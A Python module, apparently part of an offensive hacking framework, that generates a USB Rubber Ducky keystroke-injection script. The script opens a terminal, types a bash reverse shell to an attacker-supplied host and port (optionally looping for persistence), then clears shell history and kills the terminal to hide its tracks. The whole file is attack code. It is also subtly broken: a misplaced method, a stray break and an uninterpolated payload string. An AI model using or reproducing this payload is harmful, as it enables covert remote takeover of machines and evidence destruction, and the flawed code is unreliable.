from modules import helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "Rubber Duck (USB injection)"
		self.description = "Arduino payload that replicates keystrokes for shell script execution."
		self.usage = "Install via https://"
		
		def run(self,server):
			
			persistence = raw_input(h.info_general_raw("Make Persistent? (y/N): ")).lower()
			if persistence == "y":
				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				break
			elif persistence == "n" or not persistence:
				shell_command = "bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				break
			else:
				h.info_error("invalid option: " + persistence)

		shell_command += "history -wc;killall Terminal"
		if os.path.exists("payloads") == False:
			os.mkdir("payloads")
		if os.path.exists("payloads/rubber_duck") == False:
			os.mkdir("payloads/rubber_duck")
		payload_save_path = "payloads/rubber_duck/payload.txt"
		payload = """\
    DELAY 10
    CTRL ALT T
    DELAY 10
    STRING while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done
    DELAY 50
    STRING history -wc && killall Terminal
    DELAY 10
    """
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_general("Payload saved to " + payload_save_path)

		
		
